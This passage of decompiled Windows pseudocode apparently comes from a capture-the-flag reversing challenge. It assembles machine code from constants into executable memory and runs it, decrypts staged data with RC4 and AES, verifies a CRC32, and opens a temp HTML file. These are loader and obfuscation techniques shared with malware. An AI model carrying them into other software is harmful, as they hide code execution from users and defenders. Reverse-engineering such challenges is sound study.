    (*(void (__fastcall **)(_QWORD))(a1 + 856))(*(unsigned int *)(*(_QWORD *)(a1 + 264) + 8i64));
  if ( (*(unsigned int (**)(void))(a1 + 792))() <= v46[13] + 8000 )
    (*(void (__fastcall **)(_QWORD))(a1 + 856))(*(unsigned int *)(*(_QWORD *)(a1 + 264) + 8i64));
  v34 = _mm_cvtsi32_si128(v12);
  v35 = &v46[24];
  v36 = _mm_unpacklo_epi8(v34, v34);
  v37 = 2720i64;
  v38 = _mm_shuffle_epi32(_mm_unpacklo_epi16(v36, v36), 0);
  do
  {
    v39 = _mm_loadu_si128((const __m128i *)v35 - 1);
    v35 += 16;
    *((__m128i *)v35 - 5) = _mm_sub_epi8(v39, v38);
    *((__m128i *)v35 - 4) = _mm_sub_epi8(_mm_loadu_si128((const __m128i *)v35 - 4), v38);
    *((__m128i *)v35 - 3) = _mm_sub_epi8(_mm_loadu_si128((const __m128i *)v35 - 3), v38);
    *((__m128i *)v35 - 2) = _mm_sub_epi8(_mm_loadu_si128((const __m128i *)v35 - 2), v38);
    --v37;
  }
  while ( v37 );
  v40 = &v46[43540];
  v41 = 55i64;
  do
  {
    *(_BYTE *)v40 -= v12;
    v40 = (int *)((char *)v40 + 1);
    --v41;
  }
  while ( v41 );
  *(_DWORD *)(a1 + 992) = v46[14];
  *(_QWORD *)(a1 + 976) = 174135i64;
  CurrentProcess = GetCurrentProcess();
  v43 = VirtualAllocEx(CurrentProcess, 0i64, 0x2A837ui64, 0x3000u, 4u);
  *(_QWORD *)(a1 + 984) = v43;
  memmove(v43, &v46[20], 0x2A837ui64);
  CloseHandle(v25);
  return sub_7FF702102170(a1);
}
// 7FF702102170: using guessed type __int64 __fastcall sub_7FF702102170(_QWORD);

//----- (00007FF702101DA0) ----------------------------------------------------
_OWORD *sub_7FF702101DA0()
{
  _OWORD *v0; // rbx
  __m256i v2; // [rsp+20h] [rbp-29h]
  __int128 v3; // [rsp+40h] [rbp-9h]
  _BYTE v4[48]; // [rsp+50h] [rbp+7h]
  _BYTE v5[18]; // [rsp+80h] [rbp+37h]
  DWORD flOldProtect; // [rsp+B0h] [rbp+67h] BYREF

  *(__int16 *)((char *)&v2.m256i_i16[13] + 1) = -29879;
  *(_DWORD *)&v4[1] = -1958144140;
  *(_DWORD *)&v5[8] = 994162805;
  v2.m256i_i8[29] = -55;
  *(_QWORD *)&v4[13] = 0x49C2FF4802881104i64;
  *(_WORD *)&v4[24] = -3467;
  v2.m256i_i16[6] = 4213;
  v5[17] = -61;
  *(__int16 *)((char *)&v2.m256i_i16[4] + 1) = -1405;
  v2.m256i_i8[11] = 1;
  *(_DWORD *)&v4[9] = -1965978803;
  LODWORD(v3) = 977355243;
  BYTE4(v3) = -61;
  HIDWORD(v3) = 726411381;
  v4[0] = -55;
  *(_WORD *)&v4[6] = 11081;
  v4[8] = -56;
  *(_QWORD *)&v4[40] = 0x1498D49F7740159i64;
  v2.m256i_i16[3] = -19647;
  v2.m256i_i8[8] = 47;
  *(_WORD *)&v4[21] = -5501;
  v4[23] = 1;
  *(__int32 *)((char *)&v2.m256i_i32[5] + 2) = 1947809861;
  *(_DWORD *)&v5[13] = -1070350467;
  v2.m256i_i8[26] = -8;
  *(_DWORD *)((char *)&v3 + 7) = 994165503;
  *(__int32 *)((char *)&v2.m256i_i32[3] + 2) = 1964587076;
  *(_TBYTE *)&v4[26] = 5.6533954693125116868e752;
  *(_DWORD *)&v5[3] = -2080273855;
  v4[5] = -48;
  *(__int16 *)((char *)&v2.m256i_i16[1] + 1) = -29876;
  v2.m256i_i8[5] = -55;
  *(_DWORD *)&v4[36] = 944095743;
  v2.m256i_i16[15] = -11725;
  v5[12] = -46;
  v2.m256i_i16[0] = -29884;
  v2.m256i_i8[2] = -46;
  *(__int16 *)((char *)&v2.m256i_i16[9] + 1) = -183;
  v2.m256i_i8[21] = -63;
  v2.m256i_i8[18] = 8;
  *(_WORD *)v5 = -183;
  v5[2] = -63;
  BYTE11(v3) = -46;
  *(_WORD *)((char *)&v3 + 5) = 14709;
  v5[7] = -64;
  v0 = VirtualAlloc(0i64, 0x72ui64, 0x3000u, 4u);
  *(__m256i *)v0 = v2;
  v0[2] = v3;
  v0[3] = *(_OWORD *)v4;
  v0[4] = *(_OWORD *)&v4[16];
  v0[5] = *(_OWORD *)&v4[32];
  v0[6] = *(_OWORD *)v5;
  *((_WORD *)v0 + 56) = *(_WORD *)&v5[16];
  flOldProtect = 0;
  VirtualProtect(v0, 0x72ui64, 0x40u, &flOldProtect);
  return v0;
}

//----- (00007FF702101F80) ----------------------------------------------------
_OWORD *__fastcall sub_7FF702101F80(_BYTE *a1)
{
  _OWORD *result; // rax
  __int128 v2; // [rsp+20h] [rbp-59h]
  _BYTE v3[144]; // [rsp+30h] [rbp-49h]

  v3[8] = a1[1];
  v3[9] = a1[11];
  v3[25] = a1[4];
  v3[92] = a1[2];
  v3[122] = a1[3];
  v3[130] = *a1;
  *(_QWORD *)&v2 = 0x7C894808245C8948i64;
  *((_QWORD *)&v2 + 1) = 0x4C10245489481824i64;
  *(_QWORD *)v3 = 0xB86374C98548C18Bui64;
  *(_QWORD *)&v3[10] = 0x4859750139660000i64;
  *(_DWORD *)&v3[18] = -2126757533;
  *(_WORD *)&v3[22] = 2108;
  v3[24] = 80;
  *(_QWORD *)&v3[26] = 0x88C8B444C750000i64;
  *(_QWORD *)&v3[34] = 0x45C9034C00000088i64;
  *(_QWORD *)&v3[42] = 0xC933D9034C20598Bui64;
  *(_QWORD *)&v3[50] = 0x8B41327618493941ui64;
  *(_QWORD *)&v3[58] = 0x4910245C8B488B04i64;
  *(_QWORD *)&v3[66] = 0xFF98BD82B48C003i64;
  *(_QWORD *)&v3[74] = 0x411814B60F4410B6i64;
  *(_QWORD *)&v3[82] = 0x45C0FF480875D22Bi64;
  *(_WORD *)&v3[90] = -11643;
  *(_QWORD *)&v3[93] = 0x41C1FF1574D285EBi64;
  *(_QWORD *)&v3[101] = 0x48C033CE7218493Bi64;
  *(_QWORD *)&v3[109] = 0x247C8B4808245C8Bi64;
  *(_DWORD *)&v3[117] = -1958624488;
  v3[121] = 73;
  *(_DWORD *)&v3[123] = 264766281;
  *(_WORD *)&v3[127] = 5303;
  v3[129] = 121;
  *(_QWORD *)&v3[131] = 0x48BC803491C498Bi64;
  *(_DWORD *)&v3[139] = -1073526383;
  v3[143] = -21;
  result = VirtualAlloc(0i64, 0xA1ui64, 0x3000u, 0x40u);
  *result = v2;
  result[1] = *(_OWORD *)v3;
  result[2] = *(_OWORD *)&v3[16];
  result[3] = *(_OWORD *)&v3[32];
  result[4] = *(_OWORD *)&v3[48];
  result[5] = *(_OWORD *)&v3[64];
  result[6] = *(_OWORD *)&v3[80];
  result[7] = *(_OWORD *)&v3[96];
  result[8] = *(_OWORD *)&v3[112];
  result[9] = *(_OWORD *)&v3[128];
  *((_BYTE *)result + 160) = -37;
  return result;
}

//----- (00007FF702102170) ----------------------------------------------------
__int64 __fastcall sub_7FF702102170(context *a1)
{
  void (__fastcall *v2)(__int64, __int64, char *); // rax
  __int64 (__fastcall *v3)(__int64, const char *); // rsi
  _OWORD *v4; // rax
  __int64 v5; // rax
  void (__fastcall *v6)(__int64, __int64); // rax
  _BYTE v8[64]; // [rsp+20h] [rbp-89h]
  __int128 v9; // [rsp+60h] [rbp-49h]
  __int128 v10; // [rsp+70h] [rbp-39h]
  int v11; // [rsp+80h] [rbp-29h]
  char Source[16]; // [rsp+90h] [rbp-19h] BYREF
  __int128 v13; // [rsp+A0h] [rbp-9h]
  __int128 v14; // [rsp+B0h] [rbp+7h]
  __int128 v15; // [rsp+C0h] [rbp+17h]
  __int128 v16; // [rsp+D0h] [rbp+27h]
  __int128 v17; // [rsp+E0h] [rbp+37h]
  int v18; // [rsp+F0h] [rbp+47h]

  *(_DWORD *)(a1->sus2 + 8) = 5;
  v2 = (void (__fastcall *)(__int64, __int64, char *))sub_7FF702101DA0();
  v18 = 0;
  *(_OWORD *)Source = 0i64;
  v13 = 0i64;
  v14 = 0i64;
  v15 = 0i64;
  v16 = 0i64;
  v17 = 0i64;
  v2((__int64)a1, 5i64, Source);
  v3 = (__int64 (__fastcall *)(__int64, const char *))sub_7FF702101F80(Source);
  v8[54] = Source[9];
  HIBYTE(v11) = Source[6];
  v8[24] = Source[5];
  v8[0] = Source[12];
  LOBYTE(v10) = Source[7];
  *(_DWORD *)&v8[25] = 276333414;
  v8[29] = Source[8];
  *(_DWORD *)&v8[37] = -2090457227;
  WORD5(v10) = 29952;
  *(_WORD *)&v8[41] = 3192;
  v8[43] = 51;
  *(_QWORD *)((char *)&v9 + 5) = 0x74C1856645E88366i64;
  *(_WORD *)((char *)&v10 + 13) = -16333;
  *(_WORD *)&v8[55] = 2168;
  v8[57] = 108;
  *(_DWORD *)&v8[17] = 283804488;
  BYTE12(v10) = -72;
  LOWORD(v11) = -29880;
  BYTE2(v11) = 66;
  *(_QWORD *)((char *)&v10 + 2) = 0x307A834810EA8348i64;
  *(_QWORD *)&v8[46] = 0x6607744C0A788366i64;
  *(_DWORD *)&v8[30] = -2090455435;
  *(_WORD *)&v8[21] = -29880;
  v8[23] = 66;
  *(_QWORD *)&v8[1] = 0x6025048B48i64;
  LODWORD(v9) = 16768953;
  BYTE4(v9) = 0;
  HIWORD(v9) = -29880;
  BYTE1(v10) = 16;
  *(_WORD *)&v8[34] = 3704;
  v8[36] = 50;
  *(_DWORD *)&v8[58] = -1223749003;
  BYTE13(v9) = 18;
  *(_WORD *)&v8[44] = 8309;
  HIBYTE(v10) = -61;
  *(_QWORD *)&v8[9] = 0x20518B4818488B48i64;
  *(_WORD *)&v8[62] = 2112;
  if ( Source[0] != Source[10] )
    a1->ExitProcess(*(unsigned int *)(a1->sus2 + 8));
  v4 = VirtualAlloc(0i64, 0x65ui64, 0x3000u, 0x40u);
  *v4 = *(_OWORD *)v8;
  v4[1] = *(_OWORD *)&v8[16];
  v4[2] = *(_OWORD *)&v8[32];
  v4[3] = *(_OWORD *)&v8[48];
  v4[4] = v9;
  v4[5] = v10;
  *((_DWORD *)v4 + 24) = v11;
  *((_BYTE *)v4 + 100) = -61;
  v5 = ((__int64 (*)(void))v4)();
  if ( v5 )
  {
    *(_QWORD *)&a1[1].input[8] = v5;
    v6 = (void (__fastcall *)(__int64, __int64))v3(v5, "Beep");
    if ( v6 )
      v6(750i64, 300i64);
    *(_QWORD *)&a1[1].input[16] = v3;
  }
  else
  {
    a1->ExitProcess(*(unsigned int *)(a1->sus2 + 8));
  }
  strcpy_s(&a1[1].input[140], 0x20ui64, Source);
  return sub_7FF702102910(a1);
}
// 7FF702101DA0: using guessed type __int64 sub_7FF702101DA0(void);
// 7FF702101F80: using guessed type __int64 __fastcall sub_7FF702101F80(_QWORD);
// 7FF702102910: using guessed type __int64 __fastcall sub_7FF702102910(_QWORD);

//----- (00007FF7021023D0) ----------------------------------------------------
__int64 __fastcall sub_7FF7021023D0(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5)
{
  int v5; // r11d
  char *v6; // rdx
  int v7; // r10d
  int i; // eax
  int v12; // r8d
  char *v13; // r9
  int v14; // edi
  char *v15; // rcx
  int v16; // r8d
  char *v17; // r9
  int v18; // edi
  char *v19; // rcx
  __int64 v20; // rsi
  int v21; // edx
  int v22; // r8d
  _BYTE *v23; // rdi
  __int64 v24; // rbp
  __int64 v25; // r14
  char *v26; // r9
  int v27; // r10d
  int v28; // edx
  char *v29; // r9
  int v30; // r8d
  char v32[256]; // [rsp+0h] [rbp-108h] BYREF

  v5 = 0;
  v6 = v32;
  v7 = 0;
  for ( i = 0; i < 256; ++i )
    *v6++ = i;
  v12 = 0;
  v13 = v32;
  do
  {
    v14 = (unsigned __int8)*v13;
    v7 = (v14 + *(char *)(v12 % 0xFu + a1) + v7) % 256;
    v15 = &v32[v7];
    ++v12;
    *v13++ = *v15;
    *v15 = v14;
  }
  while ( v12 < 256 );
  v16 = 0;
  v17 = v32;
  do
  {
    v18 = (unsigned __int8)*v17;
    v7 = (v18 + *(char *)(v16 % 0xFu + a1) + v7) % 256;
    v19 = &v32[v7];
    ++v16;
    *v17++ = *v19;
    *v19 = v18;
  }
  while ( v16 < 256 );
  v20 = a5;
  v21 = 0;
  v22 = 0;
  if ( a5 )
  {
    v23 = a4;
    v24 = a5;
    v25 = a3 - (_QWORD)a4;
    do
    {
      v21 = (v21 + 1) % 256;
      v26 = &v32[v21];
      v27 = (unsigned __int8)*v26;
      v22 = (v27 + v22) % 256;
      *v26 = v32[v22];
      v32[v22] = v27;
      *v23 = v23[v25] ^ v32[(unsigned __int8)(v27 + *v26)];
      ++v23;
      --v24;
    }
    while ( v24 );
    v28 = 0;
    do
    {
      v5 = (v5 + 1) % 256;
      v29 = &v32[v5];
      v30 = (unsigned __int8)*v29;
      v28 = (v30 + v28) % 256;
      *v29 = v32[v28];
      v32[v28] = v30;
      *a4++ ^= v32[(unsigned __int8)(*v29 + v30)];
      --v20;
    }
    while ( v20 );
  }
  return 0i64;
}
// 7FF7021023D0: using guessed type char var_108[256];

//----- (00007FF702102620) ----------------------------------------------------
__int64 __fastcall sub_7FF702102620(char *a1, __int64 a2)
{
  unsigned int i; // eax
  char v4; // r9

  for ( i = -1; a2; --a2 )
  {
    v4 = *a1++;
    i = dword_7FF70211A8C0[(unsigned __int8)(i ^ v4)] ^ (i >> 8);
  }
  return ~i;
}
// 7FF70211A8C0: using guessed type _DWORD dword_7FF70211A8C0[256];

//----- (00007FF702102670) ----------------------------------------------------
__int64 __fastcall sub_7FF702102670(__int64 a1)
{
  __int64 v1; // rsi
  __int64 v3; // rbx
  __int64 v4; // rdx
  _BYTE *v5; // r8
  __int64 v6; // r8
  unsigned int v7; // edx
  char *i; // r9
  char v9; // cl
  __int64 v10; // rdx
  __int128 *v11; // rbx
  __int128 *v12; // rax
  __int128 v13; // xmm0
  char v15[16]; // [rsp+30h] [rbp-10h] BYREF
  int v16; // [rsp+60h] [rbp+20h]
  __int128 *v17; // [rsp+60h] [rbp+20h]
  __int16 v18; // [rsp+64h] [rbp+24h]

  v1 = 7i64;
  *(_DWORD *)(*(_QWORD *)(a1 + 264) + 8i64) = 7;
  v3 = (*(__int64 (__fastcall **)(__int64, _QWORD))(a1 + 912))(a1, *(unsigned int *)(*(_QWORD *)(a1 + 264) + 8i64));
  v4 = *(unsigned __int8 *)(a1 + 1003);
  BYTE1(v16) = *(_BYTE *)(a1 + 7);
  HIBYTE(v16) = *(_BYTE *)(a1 + 10);
  LOBYTE(v16) = *(_BYTE *)(a1 + 1003);
  BYTE2(v16) = 53;
  if ( v16 != *(_DWORD *)v3
    || (HIBYTE(v18) = *(_BYTE *)(a1 + 1001), LOBYTE(v18) = *(_BYTE *)(a1 + 9), v18 != *(_WORD *)(v3 + 4))
    || *(_BYTE *)(a1 + 11) != *(_BYTE *)(v3 + 6) )
  {
    (*(void (__fastcall **)(_QWORD))(a1 + 856))(*(unsigned int *)(*(_QWORD *)(a1 + 264) + 8i64));
  }
  v5 = *(_BYTE **)(a1 + 984);
  v15[0] = *(_BYTE *)(a1 + 1156);
  v15[1] = *(_BYTE *)(a1 + 1158);
  v15[2] = *(_BYTE *)(a1 + 1161) - 1;
  v15[3] = *(_BYTE *)(a1 + 1163);
  v15[4] = *(_BYTE *)(a1 + 1164);
  v15[5] = *(_BYTE *)(a1 + 1166);
  v15[6] = *(_BYTE *)(a1 + 1170);
  v15[7] = *(_BYTE *)(a1 + 1173);
  v15[8] = *(_BYTE *)(a1 + 1168);
  v15[9] = *(_BYTE *)(a1 + 1169);
  v15[10] = *(_BYTE *)(a1 + 1167);
  v15[11] = *(_BYTE *)(a1 + 1171);
  v15[12] = *(_BYTE *)(a1 + 1177);
  v15[13] = *(_BYTE *)(a1 + 1179);
  v15[14] = *(_BYTE *)(a1 + 1175);
  sub_7FF7021023D0((__int64)v15, v4, (__int64)v5, v5, *(_QWORD *)(a1 + 976));
  v6 = *(_QWORD *)(a1 + 976);
  v7 = -1;
  for ( i = *(char **)(a1 + 984); v6; --v6 )
  {
    v9 = *i++;
    v7 = dword_7FF70211A8C0[(unsigned __int8)(v7 ^ v9)] ^ (v7 >> 8);
  }
  v10 = ~v7;
  if ( *(_DWORD *)(a1 + 992) != (_DWORD)v10 )
    (*(void (__fastcall **)(_QWORD, __int64, __int64, char *))(a1 + 856))(
      *(unsigned int *)(*(_QWORD *)(a1 + 264) + 8i64),
      v10,
      v6,
      i);
  *(_QWORD *)(a1 + 952) = sub_7FF702102620;
  (*(void (__fastcall **)(__int64, __int64, __int64, char *))(a1 + 920))(v3, v10, v6, i);
  v11 = (__int128 *)&unk_7FF702149420;
  (*(void (__fastcall **)(void *, __int64))(a1 + 928))(&unk_7FF702149420, 960i64);
  v17 = (__int128 *)(*(__int64 (__fastcall **)(_QWORD, __int64, __int64, __int64))(a1 + 864))(
                      0i64,
                      960i64,
                      12288i64,
                      64i64);
  if ( !v17 )
    (*(void (__fastcall **)(_QWORD))(a1 + 856))(*(unsigned int *)(*(_QWORD *)(a1 + 264) + 8i64));
  v12 = v17;
  do
  {
    v12 += 8;
    v13 = *v11;
    v11 += 8;
    *(v12 - 8) = v13;
    *(v12 - 7) = *(v11 - 7);
    *(v12 - 6) = *(v11 - 6);
    *(v12 - 5) = *(v11 - 5);
    *(v12 - 4) = *(v11 - 4);
    *(v12 - 3) = *(v11 - 3);
    *(v12 - 2) = *(v11 - 2);
    *(v12 - 1) = *(v11 - 1);
    --v1;
  }
  while ( v1 );
  *v12 = *v11;
  v12[1] = v11[1];
  v12[2] = v11[2];
  v12[3] = v11[3];
  return ((__int64 (__fastcall *)(__int64))v17)(a1);
}
// 7FF7021027B6: variable 'v4' is possibly undefined
// 7FF702102828: variable 'v10' is possibly undefined
// 7FF702102828: variable 'v6' is possibly undefined
// 7FF702102828: variable 'i' is possibly undefined
// 7FF70211A8C0: using guessed type _DWORD dword_7FF70211A8C0[256];

//----- (00007FF702102910) ----------------------------------------------------
__int64 __fastcall sub_7FF702102910(__int64 a1)
{
  const char *v2; // r12
  __int64 v3; // rbx
  __int64 v4; // rcx
  __int64 v5; // r14
  __int64 v6; // r10
  __int64 v7; // r8
  _BYTE *v8; // r9
  _BYTE *v9; // rax
  __int64 v10; // rcx
  char v11; // dl
  char v12; // dl
  unsigned __int64 v13; // rcx
  char v14; // al
  __int64 v15; // xmm1_8
  char v16; // al
  __int64 v17; // rdi
  __int64 v18; // rcx
  unsigned int (__fastcall *v19)(_QWORD, _QWORD, _QWORD); // rax
  unsigned int (__fastcall *v20)(_QWORD, _QWORD, _QWORD); // rsi
  char *v21; // r8
  __int64 v22; // r9
  char v23; // dl
  __int64 v24; // rax
  char v26[32]; // [rsp+30h] [rbp-D0h] BYREF
  char v27[16]; // [rsp+50h] [rbp-B0h] BYREF
  char Buf2[32]; // [rsp+60h] [rbp-A0h] BYREF
  __int128 Buf1; // [rsp+80h] [rbp-80h] BYREF
  __int64 v30; // [rsp+90h] [rbp-70h]
  char v31; // [rsp+98h] [rbp-68h]
  __int16 v32; // [rsp+99h] [rbp-67h]

  v2 = (const char *)Parsing((char *)a1, 6);
  strcpy_s((char *)(a1 + 1124), 0x20ui64, v2);
  v3 = -1i64;
  v4 = -1i64;
  v5 = *(_QWORD *)(*(_QWORD *)(a1 + 264) + 40i64);
  do
    ++v4;
  while ( v2[v4] );
  v6 = (int)v4;
  if ( (int)v4 > 0 )
  {
    v7 = 0i64;
    do
    {
      v8 = (char *)&Buf1 + v7;
      v9 = (_BYTE *)(v5 + 1);
      v10 = 0i64;
      v11 = *((_BYTE *)&Buf1 + v7 + v2 - (const char *)&Buf1);
      while ( *v9 != v11 )
      {
        ++v10;
        v9 += 2;
        if ( v10 >= 26 )
          goto LABEL_10;
      }
      v11 = *(_BYTE *)(v5 + 2 * v10);
LABEL_10:
      ++v7;
      *v8 = v11;
    }
    while ( v7 < v6 );
  }
  *((_BYTE *)&Buf1 + v6) = 0;
  v12 = 0;
  qmemcpy(v26, "R\aB", 3);
  v13 = 0i64;
  v26[3] = 1;
  v26[4] = 74;
  v26[5] = 29;
  v26[6] = 92;
  v26[7] = 25;
  v26[8] = 75;
  v26[9] = 31;
  v26[10] = 76;
  v26[11] = 5;
  v26[12] = 75;
  v26[13] = 12;
  v26[14] = 73;
  v26[15] = 7;
  v26[16] = 78;
  v26[17] = 11;
  v26[18] = 94;
  v26[19] = 12;
  v26[20] = 91;
  v26[21] = 30;
  v26[22] = 77;
  v26[23] = 8;
  v26[24] = 70;
  do
  {
    v14 = v12 ^ v26[v13];
    v12 = v26[v13];
    Buf2[v13++] = v14;
  }
  while ( v13 < 0x19 );
  v15 = v30;
  v16 = v31;
  *(_OWORD *)(a1 + 1156) = Buf1;
  *(_QWORD *)(a1 + 1172) = v15;
  *(_BYTE *)(a1 + 1180) = v16;
  if ( !memcmp(&Buf1, Buf2, 0x19ui64) )
  {
    v17 = (*(__int64 (__fastcall **)(__int64))(a1 + 880))(4294967285i64);
    if ( v17 == -1 )
      (*(void (__fastcall **)(_QWORD))(a1 + 856))(*(unsigned int *)(*(_QWORD *)(a1 + 264) + 8i64));
    v18 = *(_QWORD *)(a1 + 960);
    strcpy(v27, "WriteConsoleA");
    v19 = (unsigned int (__fastcall *)(_QWORD, _QWORD, _QWORD))(*(__int64 (__fastcall **)(__int64, char *))(a1 + 968))(
                                                                 v18,
                                                                 v27);
    v32 = 10;
    v20 = v19;
    if ( !v19(v17, &Buf1, 26i64) )
      (*(void (__fastcall **)(_QWORD))(a1 + 856))(*(unsigned int *)(*(_QWORD *)(a1 + 264) + 8i64));
    *(_QWORD *)(a1 + 888) = v20;
  }
  do
    ++v3;
  while ( *((_BYTE *)&Buf1 + v3) );
  if ( (int)v3 > 0i64 )
  {
    v21 = (char *)v2;
    v22 = (int)v3;
    do
    {
      v23 = v21[(char *)&Buf1 - v2];
      v24 = 0i64;
      while ( *(_BYTE *)(v5 + 2 * v24) != v23 )
      {
        if ( ++v24 >= 26 )
          goto LABEL_27;
      }
      v23 = *(_BYTE *)(v5 + 2 * v24 + 1);
LABEL_27:
      *v21++ = v23;
      --v22;
    }
    while ( v22 );
  }
  v2[(int)v3] = 0;
  return sub_7FF702102670(a1);
}
// 7FF702102910: using guessed type char Buf2[32];

//----- (00007FF702102C00) ----------------------------------------------------
__int64 __fastcall Hash_and_set_key(BYTE *pbData)
{
  __int64 v2; // r8
  unsigned int v3; // ebx
  DWORD LastError; // eax
  int pbDataa; // [rsp+48h] [rbp+10h] BYREF
  HCRYPTHASH phHash; // [rsp+50h] [rbp+18h] BYREF

  phHash = 0i64;
  if ( !CryptAcquireContextW(&hProv, 0i64, 0i64, 0x18u, 0) && !CryptAcquireContextW(&hProv, 0i64, 0i64, 0x18u, 8u) )
    goto LABEL_12;
  if ( !CryptCreateHash(hProv, 0x800Cu, 0i64, 0, &phHash) )// sha256 hash
    goto LABEL_12;
  v2 = -1i64;
  do
    ++v2;
  while ( pbData[v2] );
  if ( !CryptHashData(phHash, pbData, v2, 0)
    || !CryptDeriveKey(hProv, 0x6610u, phHash, 0, &hKey)
    || (pbDataa = 1, (v3 = CryptSetKeyParam(hKey, 4u, (const BYTE *)&pbDataa, 0)) == 0) )
  {
LABEL_12:
    LastError = GetLastError();
    ExitProcess(LastError);
  }
  if ( phHash )
    CryptDestroyHash(phHash);
  return v3;
}

//----- (00007FF702102D20) ----------------------------------------------------
BOOL __fastcall sub_7FF702102D20(BYTE *pbData, DWORD a2)
{
  BOOL result; // eax
  BYTE pbDataa[24]; // [rsp+30h] [rbp-18h] BYREF
  DWORD pdwDataLen; // [rsp+60h] [rbp+18h] BYREF

  qmemcpy(pbDataa, "capture_the_flag", 16);
  result = CryptSetKeyParam(hKey, 1u, pbDataa, 0);
  if ( result )
  {
    pdwDataLen = a2;
    return CryptDecrypt(hKey, 0i64, 1, 0, pbData, &pdwDataLen);
  }
  return result;
}

//----- (00007FF702102DB0) ----------------------------------------------------
__int64 __fastcall sub_7FF702102DB0(__int64 a1, __int64 a2)
{
  HANDLE FileA; // rax
  void *v5; // rbx
  _BYTE *v6; // rdx
  __int64 v7; // r8
  __int64 result; // rax
  __int64 v9; // rdx
  CHAR TempFileName[272]; // [rsp+40h] [rbp-228h] BYREF
  CHAR Buffer[272]; // [rsp+150h] [rbp-118h] BYREF
  DWORD NumberOfBytesWritten; // [rsp+280h] [rbp+18h] BYREF

  if ( !GetTempPathA(0x104u, Buffer) )
    return 0i64;
  if ( !GetTempFileNameA(Buffer, "random", 0, TempFileName) )
    return 0i64;
  strcat_s(TempFileName, 0x104ui64, ".html");
  FileA = CreateFileA(TempFileName, 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);
  v5 = FileA;
  if ( FileA == (HANDLE)-1i64 )
    return 0i64;
  v6 = *(_BYTE **)(a1 + 984);
  v7 = -1i64;
  do
    ++v7;
  while ( v6[v7] );
  if ( !WriteFile(FileA, v6, v7, &NumberOfBytesWritten, 0i64) )
  {
    CloseHandle(v5);
    return 0i64;
  }
  CloseHandle(v5);
  if ( (int)ShellExecuteA(0i64, "open", TempFileName, 0i64, 0i64, 1) <= 32 )
    return 0i64;
  v9 = *(_QWORD *)(a1 + 984);
  result = 1i64;
  *(_WORD *)a2 = *(_WORD *)(v9 + 31);
  *(_BYTE *)(a2 + 2) = *(_BYTE *)(v9 + 33);
  return result;
}

//----- (00007FF702102F00) ----------------------------------------------------
__int64 __fastcall sub_7FF702102F00(char *Source, int a2)
{
  const char *v2; // rdi
  char *v3; // rbx
  char v4; // cl
  int i; // eax
  rsize_t v6; // rbx
  char *v7; // rax
  __int64 v8; // rsi
  __int64 result; // rax

  v2 = Source;
  v3 = Source;
  if ( a2 == 1 )
  {
    if ( *Source == 47 )
    {
      do
        ++v3;
      while ( *v3 == 47 );
    }
    v2 = v3;
  }
  v4 = *v3;
  for ( i = 0; v4; ++v3 )
  {
    if ( v4 == 47 )
    {
      if ( ++i == a2 )
        break;
      for ( ; v3[1] == 47; ++v3 )
        ;
      v2 = v3 + 1;
    }
    v4 = v3[1];
  }
  if ( i < a2 )
    return 0i64;
  v6 = v3 - v2;
  v7 = (char *)j__malloc_base(v6 + 1);
  v8 = (__int64)v7;
  if ( !v7 )
    return 0i64;
  strncpy_s(v7, v6 + 1, v2, v6);
  result = v8;
  *(_BYTE *)(v8 + v6) = 0;
  return result;
}

//----- (00007FF702103474) ----------------------------------------------------
__int64 sub_7FF702103474()
{
  uintptr_t v0; // rax
  __int64 result; // rax
  unsigned __int64 v2; // [rsp+20h] [rbp-10h] BYREF
  struct _FILETIME SystemTimeAsFileTime; // [rsp+40h] [rbp+10h] BYREF
  LARGE_INTEGER PerformanceCount; // [rsp+48h] [rbp+18h] BYREF

  v0 = _security_cookie;
  if ( _security_cookie == 0x2B992DDFA232i64 )
  {
    SystemTimeAsFileTime = 0i64;
    GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
    v2 = (unsigned __int64)SystemTimeAsFileTime;
    v2 ^= GetCurrentThreadId();
    v2 ^= GetCurrentProcessId();
    QueryPerformanceCounter(&PerformanceCount);
    v0 = ((unsigned __int64)&v2 ^ v2 ^ PerformanceCount.QuadPart ^ ((unsigned __int64)PerformanceCount.LowPart << 32)) & 0xFFFFFFFFFFFFi64;
    if ( v0 == 0x2B992DDFA232i64 )
      v0 = 0x2B992DDFA233i64;
    _security_cookie = v0;
  }
  result = ~v0;
  qword_7FF70211E020 = result;
  return result;
}
// 7FF70211E020: using guessed type __int64 qword_7FF70211E020;

//----- (00007FF702103520) ----------------------------------------------------
__int64 __fastcall UserMathErrorFunction(struct _exception *a1)
{
  return 0i64;
}

//----- (00007FF702103534) ----------------------------------------------------
void sub_7FF702103534()
{
  InitializeSListHead(&stru_7FF7021498A0);
}
// 7FF7021498A0: using guessed type union _SLIST_HEADER stru_7FF7021498A0;

//----- (00007FF702103544) ----------------------------------------------------
char sub_7FF702103544()
{
  return 1;
}

//----- (00007FF70210354C) ----------------------------------------------------
void *sub_7FF70210354C()
{
  return &unk_7FF7021498B0;
}

//----- (00007FF702103554) ----------------------------------------------------
void *sub_7FF702103554()
{
  return &unk_7FF7021498B8;
}

//----- (00007FF702103584) ----------------------------------------------------
void *sub_7FF702103584()
{
  return &unk_7FF70214AA00;
}

//----- (00007FF70210358C) ----------------------------------------------------
void *sub_7FF70210358C()
{
  return &unk_7FF70214A9F8;
}

//----- (00007FF702103594) ----------------------------------------------------
void sub_7FF702103594()
{
  dword_7FF7021498C0 = 0;
}
// 7FF7021498C0: using guessed type int dword_7FF7021498C0;

//----- (00007FF7021037B0) ----------------------------------------------------
void __cdecl RTC_Initialize()
{
  void (**i)(void); // rbx

  for ( i = qword_7FF70211B528; i < qword_7FF70211B528; ++i )
  {
    if ( *i )
      (*i)();
  }
}
// 7FF70211B528: using guessed type void (*qword_7FF70211B528[2])(void);

//----- (00007FF7021037EC) ----------------------------------------------------
void __cdecl RTC_Initialize_0()
{
  void (**i)(void); // rbx

  for ( i = &qword_7FF70211B538; i < &qword_7FF70211B538; ++i )
  {
    if ( *i )
      (*i)();
  }
}
// 7FF70211B538: using guessed type void (*qword_7FF70211B538)(void);

//----- (00007FF702105564) ----------------------------------------------------
__int64 __fastcall BuildCatchObjectHelperInternal___FrameHandler3_(
        EHExceptionRecord *pExcept,
        __int64 *pRN,
        const _s_HandlerType *pCatch,
        const _s_CatchableType *pConv)
{
  unsigned int v8; // edi
  __int64 dispType; // r15
  __int64 v10; // rdx
  __int64 v11; // rcx
  __int64 v12; // rax
  __int64 pExceptionObject; // rcx
  void *v14; // rdx
  __int64 copyFunction; // rbx
  __int64 v16; // rcx
